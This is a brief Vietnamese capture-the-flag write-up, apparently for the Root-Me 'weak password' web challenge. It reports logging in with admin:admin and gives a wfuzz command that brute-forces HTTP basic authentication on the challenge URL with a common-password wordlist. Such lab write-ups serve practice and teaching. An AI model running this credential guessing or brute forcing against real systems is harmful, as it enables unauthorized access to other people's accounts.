![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/2949e78e-84e4-4c4b-8d0b-b7eaa4b94bcc)

Vì tên lab là mật khẩu yếu nên tôi thử với vài case cơ bản nhất . và trong lần thử đầu tiền với admin:admin =))) được luôn

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/094d5e13-2817-4a8b-bc61-4832d555df15)

Hoặc không thì có thể dùng wfuzz để brute force login form

```wfuzz -c -w /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt --basic admin:FUZZ http://challenge01.root-me.org/web-serveur/ch3/```
